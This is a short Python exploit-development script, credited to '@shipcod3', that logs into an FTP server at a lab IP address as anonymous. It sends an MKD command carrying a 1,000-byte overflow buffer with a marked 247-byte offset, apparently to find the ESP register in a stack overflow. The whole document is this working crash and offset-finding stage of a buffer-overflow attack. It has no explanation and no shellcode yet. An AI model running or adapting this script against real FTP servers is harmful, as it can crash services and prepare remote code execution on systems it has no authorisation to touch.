# espfind.py - exploit scratch for finding ESP register
# author : @shipcod3
 
import socket
import sys

# offset is 247  -= edit here =-  
evil = "A"*247 + "B"*4 + "C"*749
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.93.130',21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
